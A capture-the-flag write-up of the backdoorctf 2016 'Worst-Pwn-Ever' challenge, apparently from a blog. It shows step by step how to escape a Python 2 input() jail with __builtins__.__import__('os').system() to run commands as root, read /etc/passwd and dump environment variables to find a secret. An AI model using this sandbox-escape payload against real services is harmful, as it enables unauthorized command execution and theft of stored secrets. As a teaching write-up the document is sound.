---
layout: post
title: "backdoorctf16 : Worst-Pwn-Ever"
author: dade
date: 2016-06-07 18:37:00 -0700
slug: worst-pwn-ever
category:
- 2016
- backdoorctf
---
**Category:** pwn
**Points:** 100
**Description:**

>tocttou is an enviornmentalist. But some say he has a vicious motive and he uses nature to hide his dark side. We found a weird shell on his amazon (pun inteded) web services. Can you tell us what is he upto? Tip: he might shut down the machine if he notices you - and he will (maybe in 45 seconds). <br />Access: nc hack.bckdr.in 9008
<br />
Created by: Ashish Chaudhary

# Investigation
When we first netcat into that service, we're simply presented with a `>` prompt. Let's try a couple commands useful recon commands and see what happens.

```
dade@gibson:~$ nc hack.bckdr.in 9008
> id
dade@gibson:~$ 
```

Well that didn't return anything, it just closed our session. Interesting. Let's try another.

```
dade@gibson:~$ nc hack.bckdr.in 9008
> whoami
NameError: name 'whoami' is not defined
--> WHAT ARE YOU DOING HERE? >-[
dade@gibson:~$ 
```

Well that's interesting, we got ourselves a NameError and an angry message. I write a lot of python, so NameError is familiar to me. It looks like we're in a python shell of some sort. A bit of googling around and I found this [nice writeup](https://blog.inexplicity.de/plaidctf-2013-pyjail-writeup-part-i-breaking-the-sandbox.html) about an old plaidCTF challenge called "pyjail". This gave me some valuable information on breaking out of python jails. Let's try to do an import.

```
dade@gibson:~$ nc hack.bckdr.in 9008
> import os 
NameError: invalid syntax (<string>, line 1)
--> WHAT ARE YOU DOING HERE? >-[
dade@gibson:~$ 
```

Interesting, now we can see an invalid syntax error instead of a name not defined error. I bet since it's prompting us for input, it's probably got the input() module loaded. Let's see if we can manipulate that a bit.

```
dade@gibson:~$ nc hack.bckdr.in 9008
> input(__builtins__)
<module '__builtin__' (built-in)>import os
NameError: invalid syntax (<string>, line 1)
--> WHAT ARE YOU DOING HERE? >-[
dade@gibson:~$
```
# Breaking out of the sandbox

Neat, now we see that we can access `__builtins__`. To learn more about what functions are built in, read the [python docs](https://docs.python.org/2/library/functions.html). 

Let's see how far we can take this and try to do a call directly from the builtins.

```
dade@gibson:~$ nc hack.bckdr.in 9008
> input(__builtins__.__import__('os'))
<module 'os' from '/usr/lib/python2.7/os.pyc'>^C
dade@gibson:~$
```

Now we know we can import os. That's great news for us, `import os` gives us access to all sorts of useful system utilities.

```
dade@gibson:~$ nc hack.bckdr.in 9008
> input(__builtins__.__import__('os').system("id"))
uid=0(root) gid=0(root) groups=0(root)
0
NameError: unexpected EOF while parsing (<string>, line 0)
--> WHAT ARE YOU DOING HERE? >-[
dade@gibson:~$
```

In this, I hit enter because I wasn't sure what that final 0 was doing there. It caused us to get caught and kicked out. But that's okay, we just ran the "id" command on the target and found out this python script is running as root. Let's try to get some other information from it. 

```
dade@gibson:~$ nc hack.bckdr.in 9008
> input(__builtins__.__import__('os').system("cat /etc/passwd"))
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
0input(__builtins__.__import__('os').system("ls -la ~"))       
total 16
drwx------  2 root root 4096 May  3 16:57 .
drwxr-xr-x 46 root root 4096 Jun  8 08:36 ..
-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
0^C
```
I discovered here that the 0 that we see is actually just another prompt where we can make another system call. I grabbed the list of users but didn't see any usernames that looked particularly interesting. Our target is a guy named tocctou, and none of those accounts looked like they belonged to him. I then wanted to check out the contents of the root homedir, but it only had `.bashrc` and `.profile`. What else do we know about tocctou?

# Solution
It is sometimes suggested that you use an environmental variable to store sensitive information that a script or something can then access when it needs that sensitve information. This is a [common tactic](http://12factor.net/config) to prevent yourself from accidentally pushing your api keys or passwords to github. We're told in the challenge description that tocctou is a bit of an "environmentalist", which should give us the hint that lets us wrap this all up.

```
dade@gibson:~$ nc hack.bckdr.in 9008
> input(__builtins__.__import__('os').system("printenv"))
HOSTNAME=11a6b24c4b63
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/printenv
_F_L_A_G_='[REDACTED]'
PWD=/scripts
HOME=/root
SHLVL=2
0
```

# Flag

This challenge is hosted permanently at [Backdoor](https://backdoor.sdslabs.co/challenges/WORST-PWN-EVER), so go find the flag yourself!
